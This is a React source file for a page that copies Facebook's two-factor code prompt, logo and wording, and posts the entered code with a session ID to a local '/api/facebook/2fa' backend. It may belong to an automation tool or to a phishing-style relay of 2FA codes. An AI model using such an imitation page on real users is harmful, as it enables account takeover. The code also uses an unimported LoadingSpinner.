import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import OTPInput from '../components/OTPInput';
import '../components/OTPInput.css';
import './TwoFAPage.css';

const TwoFAPage = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const [code, setCode] = useState('');
  const [loading, setLoading] = useState(false);
  const sessionId = location.state?.session_id;

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!sessionId) {
      console.error('no session id for 2fa');
      return;
    }
    setLoading(true);
    try {
      const form = new FormData();
      form.append('session_id', sessionId);
      form.append('code', code);
      const resp = await fetch('http://localhost:8000/api/facebook/2fa', {
        method: 'POST',
        body: form,
      });
      const data = await resp.json();
      console.log('submitted 2FA code', code, 'response', data);
      if (data.success) {
        navigate('/');
      } else {
        alert('2FA failed: ' + (data.error || 'unknown'));
      }
    } catch (err) {
      console.error('2fa submit error', err);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="twofa-container">
      {loading && <LoadingSpinner fullPage text="Verifying..." />}      <form className="twofa-form" onSubmit={handleSubmit}>
        <img
          src="/images/facebook_logo.svg"
          alt="Facebook"
          className="fb-logo"
        />
        <h2>Go to your authentication app</h2>
        <p className="twofa-desc">
          Enter the 6‑digit code for this account from the two‑factor
          authentication app that you set up (such as Duo Mobile or Google
          Authenticator).
        </p>
        <OTPInput
          length={6}
          value={code}
          onChange={setCode}
          error={false}
        />
        <button
          type="submit"
          className="btn continue-btn"
          disabled={code.length < 6 || loading}
        >
          Continue
        </button>
        <button type="button" className="btn try-other-btn">
          Try Another Way
        </button>
      </form>
    </div>
  );
};

export default TwoFAPage;
